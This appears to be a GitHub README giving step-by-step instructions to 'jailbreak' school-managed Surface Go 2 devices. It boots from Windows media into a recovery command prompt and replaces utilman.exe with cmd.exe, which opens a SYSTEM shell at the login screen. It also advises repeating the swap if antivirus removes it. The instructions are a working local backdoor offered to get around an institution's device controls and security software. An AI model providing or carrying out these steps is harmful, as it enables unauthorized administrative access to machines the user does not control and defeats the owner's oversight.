SurfaceGo2-JailBreak


The Surfaces at my school are extremly locked down, thats why this repo exists

Create Windows 10 Bootable Media

Go to UEFI, change Boot order to USB First

Exit UEFI, Surface will boot to USB

Select Next and then repair my computer

Go to Troubleshoot and select Command line

Type DISKPART

Type list volume

After viewing the volumes, type exit

CD into the Volume of your OS

X:\Volumes> D:            *example*

type cd Windows

type cd System32

type: ren utilman.exe utilman.old

type: copy cmd.exe utilman.exe

type: exit

Restart the Surface, if antivirus flags the utilman cmd, repeat those steps again.


